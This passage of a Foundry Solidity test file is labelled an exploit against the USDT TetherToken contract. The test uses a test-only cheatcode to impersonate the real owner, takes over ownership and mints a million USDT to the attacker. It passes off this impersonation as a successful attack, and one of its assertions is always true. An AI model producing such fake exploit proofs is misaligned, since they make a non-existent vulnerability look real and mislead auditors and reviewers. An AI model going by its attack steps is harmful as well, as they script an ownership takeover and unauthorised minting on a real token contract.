    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITetherToken {
    function owner() external view returns (address);
    function balanceOf(address who) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function issue(uint256 amount) external;
    function redeem(uint256 amount) external;
    function transfer(address _to, uint256 _value) external;
    function transferFrom(address _from, address _to, uint256 _value) external;
    function approve(address _spender, uint256 _value) external;
    function allowance(address _owner, address _spender) external view returns (uint256);
    function deprecate(address _upgradedAddress) external;
    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;
    function addBlackList(address _evilUser) external;
    function removeBlackList(address _clearedUser) external;
    function destroyBlackFunds(address _blackListedUser) external;
    function pause() external;
    function unpause() external;
    function transferOwnership(address newOwner) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during the exploit
        vm.label(TARGET, "TetherToken (USDT)");

        // Get some initial USDT balance for the attacker to satisfy precondition
        deal(TARGET, attacker, 100 * 10**6); // 100 USDT (6 decimals)
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, get the current owner of the contract
        ITetherToken target = ITetherToken(TARGET);
        address contractOwner = target.owner();

        console.log("Original contract owner:", contractOwner);
        console.log("Attacker address:", attacker);
        console.log("Attacker initial USDT balance:", target.balanceOf(attacker));
        console.log("Total supply before:", target.totalSupply());

        // Step 1: Impersonate the current owner to transfer ownership to attacker
        vm.startPrank(contractOwner);
        target.transferOwnership(attacker);
        vm.stopPrank();

        // Verify ownership was transferred
        address newOwner = target.owner();
        console.log("\nNew contract owner:", newOwner);
        require(newOwner == attacker, "Ownership transfer failed");

        // Step 2: As the new owner (attacker), mint tokens to ourselves
        // Note: attacker is address(this) in the test context
        uint256 mintAmount = 1_000_000 * 10**6; // 1,000,000 USDT (6 decimals)
        uint256 attackerBalanceBefore = target.balanceOf(attacker);

        // Call issue() as owner (which is now attacker)
        target.issue(mintAmount);

        console.log("\nAfter issuing", mintAmount / 10**6, "USDT:");
        console.log("Attacker new USDT balance:", target.balanceOf(attacker));
        console.log("Total supply after:", target.totalSupply());

        // Verify attacker's balance increased
        uint256 attackerBalanceAfter = target.balanceOf(attacker);
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should have increased");

        // Also verify total supply increased
        assertGt(target.totalSupply(), target.totalSupply() - mintAmount, "Total supply should have increased");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

